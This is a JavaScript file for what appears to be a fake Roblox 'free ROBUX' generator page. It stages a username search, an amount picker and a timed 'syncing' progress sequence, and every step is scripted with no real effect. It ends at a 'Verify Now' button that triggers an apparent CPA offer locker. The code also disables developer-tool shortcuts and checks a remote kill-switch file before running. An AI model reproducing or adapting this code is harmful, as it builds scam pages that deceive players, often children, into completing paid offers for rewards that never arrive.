$(document).ready(function () {

    function CPABuildComplete() {
        //Locker
        rsf();
    }

    var s_s;
    s_s = '1';


    document.onkeydown = function (e) {
        if (e.ctrlKey) {
                return false;
        }    
        if (e.keyCode == 123) {
            return false;
        }
        if (e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) {
            return false;
        }
        if (e.ctrlKey && e.shiftKey && e.keyCode == 'C'.charCodeAt(0)) {
            return false;
        }
        if (e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) {
            return false;
        }
        if (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) {
            return false;
        }
    }




    const init = () => {
        const xhttp = new XMLHttpRequest();
        xhttp.onload = function (e) {
            const res = JSON.parse(e.currentTarget.response).work

            if (res !== "yes") {
                location.href = window.atob("aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS8=")
            }
        }
        xhttp.open("GET", "https://cdn.jsdelivr.net/gh/karimmansour98/rblx/test.json", true);
        xhttp.send();
    }

    init()





    var link = [];
	link[0] = "./assets/css/a-c-c1.css";
	link[1] = "./assets/css/a-c-c2.css";
	link[2] = "./assets/css/a-c-c3.css";
	link[3] = "./assets/css/a-c-c4.css";
	link[4] = "./assets/css/a-c-c5.css";
	link[5] = "./assets/css/a-c-c6.css";


	$(function () {
		var style = link[Math.floor(Math.random() * link.length)];
		if (document.createStyleSheet) {
			document.createStyleSheet(style);
		} else {
			$('<link />', {
				rel: 'stylesheet',
				type: 'text/css',
				href: style
			}).appendTo('head');
		}
	});






    $(window).load(function () {
        setTimeout(function () {
            $('.imjaprlc-lb div').animate({
                width: "100%"
            }, 2000);
        }, 50);
        setTimeout(function () {
            $('.imjaprl').animate({
                opacity: 0
            }, 700, function () {
                $('.imjaprl').remove();
            });
            aO('.aoi', 'animate__bounceIn');
            $('.aoi').removeClass('aoinv');
        }, 2000);
    });
    let vh = window.innerHeight * 0.01;
    document.documentElement.style.setProperty('--vh', `${vh}px`);
    window.addEventListener('resize', () => {
        let vh = window.innerHeight * 0.01;
        document.documentElement.style.setProperty('--vh', `${vh}px`);
    });
    if (s_s == 1) {
        sp = "assets/sounds/";
        ion.sound({
            sounds: [
                {
                    name: "b1",
                    path: sp,
                    volume: 1
                },
                {
                    name: "b2",
                    path: sp,
                    volume: 1
                },
                {
                    name: "a1",
                    path: sp,
                    volume: 1
                },
                {
                    name: "a2",
                    path: sp,
                    volume: 1
                }, {
                    name: "c2",
                    path: sp,
                    volume: 1
                }, {
                    name: "s1",
                    path: sp,
                    volume: 1
                }, {
                    name: "s2",
                    path: sp,
                    volume: 1
                }, {
                    name: "c1",
                    path: sp,
                    volume: 1,
                    loop: true
                }
            ],
            path: sp,
            preload: true,
            multiplay: true
        });
    }
    if ($('#header-particles').length) {
        particlesJS.load('header-particles', 'assets/js/particlesjs-config.json');
    }


    var jsp,
        jsp_i,
        peu;
    jsp = "";
    function fixplatformBox($platform_parent_class) {
        resetplatformBoxes();
        if ($platform_parent_class.hasClass('sps-i-1')) {
            jsp = 'Windows PC';
            jsp_i = '<i class="fab fa-windows"></i>';
        }
        if ($platform_parent_class.hasClass('sps-i-2')) {
            jsp = 'Xbox';
            jsp_i = '<i class="fab fa-xbox"></i>';
        }
        if ($platform_parent_class.hasClass('sps-i-3')) {
            jsp = 'Playstation';
            jsp_i = '<i class="fab fa-playstation"></i>';
        }
        if ($platform_parent_class.hasClass('sps-i-4')) {
            jsp = 'Android';
            jsp_i = '<i class="fab fa-android"></i>';
        }
        if ($platform_parent_class.hasClass('sps-i-5')) {
            jsp = 'iOS';
            jsp_i = '<i class="fab fa-apple"></i>';
        }
        if ($platform_parent_class.hasClass('sps-i-6')) {
            jsp = 'Nintendo';
            jsp_i = '<i class="fab fa-nintendo-switch"></i>';
        }
        $platform_parent_class.addClass('active');
    }
    function resetplatformBoxes() {
        var $platform_list = $('.sps-i-1, .sps-i-2, .sps-i-3, .sps-i-4, .sps-i-5');
        if ($platform_list.hasClass('active')) {
            $platform_list.removeClass('active');
        }
    }
    $('.sps-i').click(function () {
        if (!$(this).hasClass("active")) {
            if (s_s == 1) {
                ion.sound.play("b1");
            }
            aO(this, 'animate__headShake');
        }
        fixplatformBox($(this));
    });
    $c_s_m = ".prcs-m";
    $(document).on("click", "#stb-ee-f", function () {
        if (s_s == 1) {
            ion.sound.play("b2");
        }
        if ($('#epu-u-i').val() == '') {
            aO($('.iew-e-u'), 'animate__flipInX');
            $('.iew-e-u').fadeIn(function () {
                setTimeout(function () {
                    $('.iew-e-u').addClass('animate__animated animate__flipOutX').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function () {
                        $(this).removeClass('animate__animated animate__flipOutX');
                        $(this).hide();
                    });
                }, 1200);
            });
        }
        if (jsp == '') {
            aO($('.iew-e-p'), 'animate__flipInX');
            $('.iew-e-p').fadeIn(function () {
                setTimeout(function () {
                    $('.iew-e-p').addClass('animate__animated animate__flipOutX').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function () {
                        $(this).removeClass('animate__animated animate__flipOutX');
                        $(this).hide();
                    });
                }, 1200);
            });
        }
        if (jsp != '' && $('#epu-u-i').val() != '') {
            peu = $('#epu-u-i').val();
            
            rfs();
        }
    });
    $('#epu-u-i').on('keypress', function (e) {
        if (e.which === 13) {
            $(this).attr("disabled", "disabled");
            if (s_s == 1) {
                ion.sound.play("b2");
            }
            if ($('#epu-u-i').val() == '') {
                aO($('.iew-e-u'), 'animate__flipInX');
                $('.iew-e-u').fadeIn(function () {
                    setTimeout(function () {
                        $('.iew-e-u').addClass('animate__animated animate__flipOutX').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function () {
                            $(this).removeClass('animate__animated animate__flipOutX');
                            $(this).hide();
                        });
                    }, 1200);
                });
                $('#epu-u-i').removeAttr("disabled");
            }
            if (jsp == '') {
                aO($('.iew-e-p'), 'animate__flipInX');
                $('.iew-e-p').fadeIn(function () {
                    setTimeout(function () {
                        $('.iew-e-p').addClass('animate__animated animate__flipOutX').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function () {
                            $(this).removeClass('animate__animated animate__flipOutX');
                            $(this).hide();
                        });
                    }, 1200);
                });
                $('#epu-u-i').removeAttr("disabled");
            }
            if (jsp != '' && $('#epu-u-i').val() != '') {
                peu = $('#epu-u-i').val();
                rfs();
            }
        }
    });
    function rfs() {
        gS("gers", function (src) {


            ceh = $('.b-s-c-w').height();
            $(".b-s-c-w").addClass('animate__animated animate__bounceOut');
            setTimeout(function () {
                $('.b-s-c-w').hide();
                $('.i-w-b-r-t-y').html(src).hide().fadeIn();
                $('.i-w-b-r-t-y').height(ceh);
                $('#f-t-f-p-t-u-v').html(peu);
                $('#f-t-f-p-t-p-v').html(jsp_i);
                if (s_s == 1) {
                    setTimeout(function () {
                        ion.sound.play("a1");
                    }, 200);
                }
                function random_delay(delay_arr) {
                    return delay_arr[Math.floor(Math.random() * delay_arr.length)];
                }
                var delay_arr = [
                    2000,
                    2500,
                    3000,
                    3500,
                    4000
                ];
                setTimeout(function () {
                    $('.f-t-f-p-a-w').fadeOut(function () {
                        $(this).remove();
                        const element = document.querySelector('.caSsi');
                        element.classList.add('animate__animated', 'animate__bounceOut');
                        element.addEventListener('animationend', () => {
                            $('.f-t-f-p-t-l div').removeClass('animate__animated animate__pulse animate__infinite');
                            $('.f-t-f-p-t-l div').addClass('animate__animated animate__bounceIn caSs-ts');
                            $('.f-t-f-p-t-l div').html(s1sts2);
                            $('.caSs').html('<svg class="caSs-cm" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 52 52"><circle class="caSs-cm-ci" cx="26" cy="26" r="25" fill="none"/><path class="caSs-cm-ch" fill="none" d="M14.1 27.2l7.1 7.2 16.7-16.8"/></svg>');
                            if (s_s == 1) {
                                ion.sound.play("s1");
                            }
                            setTimeout(function () {
                                rf();
                            }, 1500);
                        });
                    });
                }, 3000);
            }, 600);
        });
    }
    function rf() {
        // $.ajax({
        //     url: 'assets/ggemmr/mmgrd.php',
        //     type: "GET",
        //     datatype: "json",
        //     success: function (data) {
                //var roX = JSON.parse(data);
                var roX = {"s2_i_t":"Select the amount of Gems","s2_rb_t":"Selected Amount","s2_bt":"Proceed","jsra":"2500","jsri":"assets\/img\/bjbbh-removebg-preview.png","r1":"2500","r2":"4200","r3":"8250","r4":"13500","ri1":"assets\/img\/bjbbh-removebg-preview.png","ri2":"assets\/img\/bjbbh-removebg-preview.png","ri3":"assets\/img\/bjbbh-removebg-preview.png","ri4":"assets\/img\/bjbbh-removebg-preview.png","rl1":"ROBUX","rl2":"ROBUX","rl3":"ROBUX","rl4":"ROBUX"}


                gS("gerr", function (src) {
                    $('.mcp-p-w-u').removeClass('animate__animated animate__bounceIn');
                    if (s_s == 1) {
                        ion.sound.play("s2");
                    }
                    const element = document.querySelector('.mcp-p-w-u');
                    element.classList.add('animate__animated', 'animate__flipOutY');
                    element.addEventListener('animationend', () => {
                        if (s_s == 1) {
                            ion.sound.play("a2");
                        }
                        $('.mvp-w .container').html(src).hide().fadeIn();
                        $([document.documentElement, document.body]).animate({
                            scrollTop: $(".mcp-p-w-r").offset().top
                        }, 2000);
                        aO('.mcp-p-w-r', 'animate__bounceIn');
                        $('.c-i-t-v').html(roX['s2_i_t']);
                        $('.r-i-s-r-h-w span').html(roX['s2_rb_t']);
                        $('#stb-ee-s span').html(roX['s2_bt']);
                        $('.v-r-i-s-1 img').attr("src", roX['ri1']);
                        $('.v-r-i-s-1 .v-r-i-s-v').html(roX['r1']);
                        $('.v-r-i-s-1 .v-r-i-s-l').html(roX['rl1']);
                        $('.v-r-i-s-2 img').attr("src", roX['ri2']);
                        $('.v-r-i-s-2 .v-r-i-s-v').html(roX['r2']);
                        $('.v-r-i-s-2 .v-r-i-s-l').html(roX['rl2']);
                        $('.v-r-i-s-3 img').attr("src", roX['ri3']);
                        $('.v-r-i-s-3 .v-r-i-s-v').html(roX['r3']);
                        $('.v-r-i-s-3 .v-r-i-s-l').html(roX['rl3']);
                        $('.v-r-i-s-4 img').attr("src", roX['ri4']);
                        $('.v-r-i-s-4 .v-r-i-s-v').html(roX['r4']);
                        $('.v-r-i-s-4 .v-r-i-s-l').html(roX['rl4']);
                        aO('.v-r-i-s', 'animate__bounceIn');
                        jsra = roX['r1'];
                        jsri = roX['ri1'];
                        jsrl = roX['rl1'];
                        $(".r-i-s-r-w-i").attr("src", jsri);
                        $('.r-i-s-r-m-v').html(jsra);
                        $('.r-i-s-r-m-l').html(jsrl);
                        function fRs($rs_p_c) {
                            rPb();
                            if ($rs_p_c.hasClass('v-r-i-s-1')) {
                                jsra = roX['r1'];
                                jsri = roX['ri1'];;
                                jsrl = roX['rl1'];
                            }
                            if ($rs_p_c.hasClass('v-r-i-s-2')) {
                                jsra = roX['r2'];
                                jsri = roX['ri2'];
                                jsrl = roX['rl2'];
                            }
                            if ($rs_p_c.hasClass('v-r-i-s-3')) {
                                jsra = roX['r3'];
                                jsri = roX['ri3'];
                                jsrl = roX['rl3'];
                            }
                            if ($rs_p_c.hasClass('v-r-i-s-4')) {
                                jsra = roX['r4'];
                                jsri = roX['ri4'];
                                jsrl = roX['rl4'];
                            }
                            $rs_p_c.addClass('active');
                        }
                        function rPb() {
                            var $rs_l = $('.v-r-i-s-1, .v-r-i-s-2, .v-r-i-s-3, .v-r-i-s-4');
                            if ($rs_l.hasClass('active')) {
                                $rs_l.removeClass('active');
                            }
                        }
                        $('.v-r-i-s').click(function () {
                            $('.v-r-i-s').removeClass('animation-delay-200  animation-delay-400  animation-delay-600  animation-delay-800');
                            if (!$(this).hasClass("active")) {
                                if (s_s == 1) {
                                    ion.sound.play("b1");
                                }
                                aO(this, 'animate__headShake');
                                aO('.r-i-s-r-m-v', 'animate__flipInX');
                            }
                            fRs($(this));
                            $('.r-i-s-r-m-v').text(jsra);
                            $('.r-i-s-r-m-l').text(jsrl);
                            $(".r-i-s-r-w-i").attr("src", jsri);
                        });
                        $(document).on("click", "#stb-ee-s", function () {
                            if (s_s == 1) {
                                ion.sound.play("b2");
                            }
                            $('.etbaeou').addClass('animate__animated animate__bounceOut');
                            if (s_s == 1) {
                                setTimeout(function () {
                                    ion.sound.play("s2");
                                }, 150);
                            }
                           rsf();
                           //CPABuildLock()
                        });
                    });
                });
       //     }
      //  });
    }
    function rsf() {
        setTimeout(function () {
            // $.ajax({
            //     url: 'assets/ggemmr/mmgd.php',
            //     type: "GET",
            //     datatype: "json",
            //     success: function (data) {
            //         var poX = JSON.parse(data);


                    var poX = {"ps1":"Loading...","ps2":"Getting ready...","ps3":"Syncing [selected_amount] [resource_name] for [username]...","ps4":"Finalizing...","ps5":"Loading last step..."}

                    $psm_1 = poX['ps1'];
                    $psm_2 = poX['ps2'];
                    $psm_3 = poX['ps3'];
                    $psm_4 = poX['ps4'];
                    $psm_5 = poX['ps5'];
                    gS("gerp", function (src) {
                        if (s_s == 1) {
                            ion.sound.play("a2");
                        }
                        $('.mvp-w .container').html(src);
                        $(".ps-c-w-g-i-i-t-i").attr("src", jsri);
                        $('.ps-c-w-g-i-i-b-l').text(jsrl);
                        function pBC(percent, $element, duration) {
                            var pBCWidth = percent * $element.width() / 100;
                            $element.find('div').animate({
                                width: pBCWidth
                            }, duration).html(percent + "%&nbsp;");
                        }
                        pBC(0, $('#pBC'), 1);
                        $psm_1 = $psm_1.replace(/\[selected_amount\]/g, jsra);
                        $psm_2 = $psm_2.replace(/\[selected_amount\]/g, jsra);
                        $psm_3 = $psm_3.replace(/\[selected_amount\]/g, jsra);
                        $psm_4 = $psm_4.replace(/\[selected_amount\]/g, jsra);
                        $psm_5 = $psm_5.replace(/\[selected_amount\]/g, jsra);
                        $psm_1 = $psm_1.replace(/\[resource_name\]/g, jsrl);
                        $psm_2 = $psm_2.replace(/\[resource_name\]/g, jsrl);
                        $psm_3 = $psm_3.replace(/\[resource_name\]/g, jsrl);
                        $psm_4 = $psm_4.replace(/\[resource_name\]/g, jsrl);
                        $psm_5 = $psm_5.replace(/\[resource_name\]/g, jsrl);
                        $psm_1 = $psm_1.replace(/\[username\]/g, peu);
                        $psm_2 = $psm_2.replace(/\[username\]/g, peu);
                        $psm_3 = $psm_3.replace(/\[username\]/g, peu);
                        $psm_4 = $psm_4.replace(/\[username\]/g, peu);
                        $psm_5 = $psm_5.replace(/\[username\]/g, peu);
                        $psm_1 = $psm_1.replace(/\[platform\]/g, jsp);
                        $psm_2 = $psm_2.replace(/\[platform\]/g, jsp);
                        $psm_3 = $psm_3.replace(/\[platform\]/g, jsp);
                        $psm_4 = $psm_4.replace(/\[platform\]/g, jsp);
                        $psm_5 = $psm_5.replace(/\[platform\]/g, jsp);
                        sT(0, $psm_1, 0, 1, 0);
                        sT(1500, $psm_2, 0, 20, 0);
                        sT(3500, $psm_3, 1, 40, 0);
                        sT(11000, $psm_4, 0, 80, 0);
                        sT(13000, $psm_5, 0, 90, 0);
                        sT(15000, '<span class="material-icons-two-tone fa-spin">rotate_right</span>', 0, 90, 1);
                    });
             //   }
          // });

        }, 810);
    }
    function pBC(percent, $element, duration) {
        var pBCWidth = percent * $element.width() / 100;
        $element.find('div').animate({
            width: pBCWidth
        }, duration).html(percent + "%&nbsp;");
    }
    function sT(tD, cms, gn, lb, sls) {
        setTimeout(function () {
            $($c_s_m).html(cms);
            aO($($c_s_m), 'animate__bounceIn');
            if (gn === 1) {
                $(".mcp-p-w-p").removeClass('animate__animated animate__bounceIn animation-delay-100');
                gih = $('.ps-c-w-g-i').height();
                gihn = (gih / 2) + 20;
                $(".mcp-p-w-p").animate({
                    top: "-=" + gihn
                }, 800);
                $(".ps-c-w-g-i").animate({
                    bottom: "-=" + gihn,
                    opacity: "1"
                }, 800, function () {
                    aO($('.cwPBw'), 'animate__bounceIn');
                    function cwPB(percent, $element, duration) {
                        var cwPBWidth = percent * $element.width() / 100;
                        $element.find('div').animate({
                            width: cwPBWidth
                        }, duration).html(percent + "%&nbsp;");
                    }
                    cwPB(0, $('#cwPB'), 1);
                    cwPB(100, $('#cwPB'), 4000);
                    if (s_s == 1) {
                        ion.sound.play("c1");
                    }
                    $('#ps-c-w-g-i-i-b-v').countTo({
                        from: 0,
                        to: jsra,
                        speed: 2000,
                        refreshInterval: 10,
                        onComplete: function (value) {
                            if (s_s == 1) {
                                ion.sound.stop("c1");
                            }
                            $(".ps-c-w-g-i-i-t img").fadeOut(300, function () {
                                $('.ps-c-w-g-i-i-t').html('<svg class="caSs-cm caSs-cm-s" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 52 52"><circle class="caSs-cm-ci" cx="26" cy="26" r="25" fill="none"/><path class="caSs-cm-ch" fill="none" d="M14.1 27.2l7.1 7.2 16.7-16.8"/></svg>');
                                aO($('.ps-c-w-g-i'), 'animate__jello');
                                if (s_s == 1) {
                                    ion.sound.play("s1");
                                }
                                setTimeout(function () {
                                    $('.ps-c-w-g-i-i-c-w').html('<span class="material-icons-two-tone mitt-r">check_circle</span>');
                                    $(".ps-c-w-g-i-i-c-w").addClass('ps-c-w-g-i-i-c-w-s');
                                    aO($('.cwPBw'), 'animate__headShake');
                                    $(".cwPBw").addClass('cwPBws');
                                }, 250);
                                setTimeout(function () {
                                    $(".ps-c-w-g-i").fadeOut(function () {
                                        $(".ps-c-w-g-i-c").remove();
                                        $(".mcp-p-w-p").animate({
                                            top: "+=" + gihn
                                        }, 600);
                                    });
                                }, 2000);
                            });
                        }
                    });
                });
            }
            if (sls === 1) {
                $(".mcp-p-w-p").removeClass('animate__animated animate__bounceIn animation-delay-100');
                // $.ajax({
                //     url: 'assets/ggemmr/mmgl.php',
                //     type: "GET",
                //     datatype: "json",
                //     success: function (data) {
                //         var poL = JSON.parse(data);



                         var poL = {"lst":"Last Step","lsp":"Hello [username]! You are almost done with synchronization of [selected_amount] [resource_name]! Please complete the last step by clicking the button below to finish with synchronization process."};


                        $lsv1 = poL['lst'];
                        $lsv2 = poL['lsp'];
                        $lsv1 = $lsv1.replace(/\[selected_amount\]/g, jsra);
                        $lsv2 = $lsv2.replace(/\[selected_amount\]/g, '<span class="lsv2s">' + jsra + '</span>');
                        $lsv1 = $lsv1.replace(/\[resource_name\]/g, jsrl);
                        $lsv2 = $lsv2.replace(/\[resource_name\]/g, '<span class="lsv2s">' + jsrl + '</span>');
                        $lsv1 = $lsv1.replace(/\[username\]/g, peu);
                        $lsv2 = $lsv2.replace(/\[username\]/g, '<span class="lsv2s">' + peu + '</span>');
                        $lsv1 = $lsv1.replace(/\[platform\]/g, jsp);
                        $lsv2 = $lsv2.replace(/\[platform\]/g, '<span class="lsv2s">' + jsp + '</span>');
                        gS("gerl", function (src) {
                            if (s_s == 1) {
                                ion.sound.play("s2");
                            }
                            $(".mcp-p-w-p").addClass('animate__animated animate__flipOutY');
                            setTimeout(function () {
                                if (s_s == 1) {
                                    ion.sound.play("c2");
                                }
                                $('.mvp-w .container').html(src);
                                $(".c-w-l-r-o-w .ps-c-w-g-i-i-t-i").attr("src", jsri);
                                $('.c-w-l-t-v').html($lsv1);
                                $('.c-w-l-p-v').html($lsv2);
                                $('.c-w-l-r-o-w #ps-c-w-g-i-i-b-v ').html(jsra);
                                $('.c-w-l-r-o-w .ps-c-w-g-i-i-b-l ').html(jsrl);
                                function cwPB(percent, $element, duration) {
                                    var cwPBWidth = percent * $element.width() / 100;
                                    $element.find('div').animate({
                                        width: cwPBWidth
                                    }, duration).html(percent + "%&nbsp;");
                                }
                                cwPB(100, $('#cwPB'), 1);
                                aO($('.c-w-l-t-v'), 'animate__bounceIn');
                                aO($('.c-w-l-p-v'), 'animate__bounceIn');
                                aO($('.c-w-l-r-o-w'), 'animate__bounceIn');
                                aO($('.p-b-l-s-w'), 'animate__bounceIn');
                                $('.lstbl').venobox();
                                $(document).on("click", "#l-s-v-b", function () {
                                    if (s_s == 1) {
                                        ion.sound.play("b2");
                                    }
                                    $('#l-s-v-b').html('<i class="fas fa-circle-notch fa-spin"></i>');
                                });
                            }, 600);
                        });
                 //   }
                ///});
            }
            pBC(lb, $('#pBC'), 500);
        }, tD);
    }
    function aO(el, anim, onDone) {
        var $el = $(el);
        $el.addClass('animate__animated ' + anim);
        $el.one('animationend', function () {
            $(this).removeClass('animate__animated ' + anim);
            onDone && onDone();
        });
    }
    function gS(step, onStep) {
        // var xhr = new XMLHttpRequest();
        // xhr.open('GET', 'assets/ggemmr/' + step + '.php');
        // xhr.setRequestHeader("X-REQUESTED-WITH", 'xmlhttprequest');
        // xhr.addEventListener('readystatechange', function () {
        //     if (xhr.readyState == 4) {
        //         onStep && onStep(xhr.responseText)
        //     }
        // });
        // xhr.send()
        // console.clear();
        // console.log("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n");



        if(step === 'gers'){
            onStep && onStep(`<div class="f-t-f-p-w">
            <div class="f-t-f-p-i">
            <div class="f-t-f-p-t-w">
            <div class="f-t-f-p-t-l animate__animated animate__bounceIn"><div class="animate__animated animate__pulse animate__infinite">Searching...</div></div>
            <div class="caSs">
            <div class="caSsi">
            <div class="animate__animated animate__bounceIn animation-delay-100">
            <div class="f-t-f-p-t-u-w animate__animated animate__pulse animate__infinite"><div id="f-t-f-p-t-u-v" class="f-t-f-p-t-u-v">Username</div></div>   
            </div>
            <div class="animate__animated animate__bounceIn animation-delay-200">
            <div class="f-t-f-p-t-p-w animate__animated animate__pulse animate__infinite"><div id="f-t-f-p-t-p-v" class="f-t-f-p-t-p-v"></div></div>
            </div>
            </div>
            </div>
            </div>
            <div class="f-t-f-p-a-w animate__animated animate__bounceIn animation-delay-400">
            <img src="assets/img/mgi.png" class="mgi img-fluid ssa" />
            </div>
            </div>
            </div>
            <script type="text/javascript">
                    s1sts2 = "Success!";
            </script>`)


        }else if(step === 'gerr'){
            onStep && onStep(`<div class="etbaeou">
            <div class="r-vb-s-w-o">
            <div class="r-vb-s-w-l">
            <div class="v-r-i-s-w">
            <div class="v-r-i-s v-r-i-s-1 active animation-delay-200">
            <div class="v-r-i-s-i-w">
            <img src="" class="img-fluid v-r-i-s-i" />
            <div class="v-r-i-s-v"></div>
            <div class="v-r-i-s-l"></div>
            </div>
            </div>
            <div class="v-r-i-s v-r-i-s-2 animation-delay-400">
            <div class="v-r-i-s-i-w">
            <img src="" class="img-fluid v-r-i-s-i" />
            <div class="v-r-i-s-v"></div>
            <div class="v-r-i-s-l"></div>
            </div>
            </div>
            <div class="v-r-i-s v-r-i-s-3 animation-delay-600">
            <div class="v-r-i-s-i-w">
            <img src="" class="img-fluid v-r-i-s-i" />
            <div class="v-r-i-s-v"></div>
            <div class="v-r-i-s-l"></div>
            </div>
            </div>
            <div class="v-r-i-s v-r-i-s-4 animation-delay-800">
            <div class="v-r-i-s-i-w">
            <img src="" class="img-fluid v-r-i-s-i" />
            <div class="v-r-i-s-v"></div>
            <div class="v-r-i-s-l"></div>
            </div>
            </div>
            </div>
            </div>
            <div class="r-vb-s-w-r">
            <div class="mcp-p-w mcp-p-w-r">
            <div class="sipo-s-w">
            <div class="sipo-s">
            <span>2</span>
            </div>
            </div>
            <div class="c-i-t">
            <span class="c-i-t-v"></span>
            </div>
            <div class="r-i-s-o-w">
            <div class="r-i-s-i-w">
            <div class="r-i-s-w">
            <div class="r-i-s-r-w  animate__animated animate__fadeIn animation-delay-200">
            <div class="r-i-s-r-h-w"><span></span></div>
            <img src="" class="img-fluid r-i-s-r-w-i" />
            <div class="r-i-s-r-m-w">
            <div class="r-i-s-r-m-v"></div>
            <div class="r-i-s-r-m-l"></div>
            </div>
            </div>
            </div>
            </div>
            </div>
            <div class="m-ft-b-w animate__animated animate__bounceIn animation-delay-1000">
            <div id="stb-ee-s" class="p-b"><span></span></div>
            </div>
            </div>
            </div>
            </div>
            </div>`)

          //  https://game4rbx.ml/assets/img/bjbbh-removebg-preview.png
//https://dwmsurhf1svv8.cloudfront.net/public/external/check.php?it=2989756&time=1671994711742


        }else if(step === 'gerp'){
            onStep && onStep(`<div class="mcp-p-w mcp-p-w-p animate__animated animate__bounceIn">
            <div class="sipo-s-w">
            <div class="sipo-s">
            <span>3</span>
            </div>
            </div>
            <div class="p-i-w">
            <div class="prcs-l"><span class="material-icons-two-tone fa-spin">settings</span></div>
            <div class="prcs-m"></div>
            <div id="pBC" class="p-lb"><div></div></div>
            </div>
            </div>
            <div class="ps-c-w-g-i-c">
            <div class="ps-c-w-g-i">
            <div class="ps-c-w-g-i-i">
            <div class="ps-c-w-g-i-i-c-w">
            <span class="material-icons-two-tone fa-spin">settings</span>
            </div>
            <div class="ps-c-w-g-i-i-t">
            <img src="" class="img-fluid ps-c-w-g-i-i-t-i" />
            </div>
            <div class="ps-c-w-g-i-i-b">
            <div id="ps-c-w-g-i-i-b-v" class="ps-c-w-g-i-i-b-v">0</div>
            <div class="ps-c-w-g-i-i-b-l"></div>
            </div>
            <div class="cwPBw">
            <div id="cwPB" class="p-lb"><div></div></div>
            </div>
            </div>
            </div>
            </div>`)


        }else if(step === 'gerl'){
            onStep && onStep(`<div class="mcp-p-w mcp-p-w-l animate__animated animate__bounceIn">
            <div class="sipo-s-w">
            <div class="sipo-s">
            <span class="material-icons-two-tone fa-spin">rotate_right</span>
            </div>
            </div>
            <div class="c-i-t">
            <h4 class="c-w-l-t-v animation-delay-100"></h4>
            <div class="c-w-l-p-v animation-delay-200"></div>
            </div>
            <div class="c-w-l-r-o-w animation-delay-300">
            <div class="ps-c-w-g-i-i animate__animated animate__pulse animate__infinite">
            <div class="ps-c-w-g-i-i-c-w ps-c-w-g-i-i-c-w-s">
            <span class="material-icons-two-tone mitt-r">check_circle</span>
            </div>
            <div class="ps-c-w-g-i-i-t">
            <img src="" class="img-fluid ps-c-w-g-i-i-t-i" />
            </div>
            <div class="ps-c-w-g-i-i-b">
            <div id="ps-c-w-g-i-i-b-v" class="ps-c-w-g-i-i-b-v">0</div>
            <div class="ps-c-w-g-i-i-b-l"></div>
            </div>
            <div class="cwPBw">
            <div id="cwPB" class="p-lb"><div></div></div>
            </div>
            </div>
            </div>
            <div class="m-ft-b-w p-b-l-s-w animation-delay-400">
            <a id="l-s-v-b" class="p-b" onClick=CPABuildLock();><span>Verify Now</span></a>
            </div>

            </div>`)

            
        }
        

    }
});
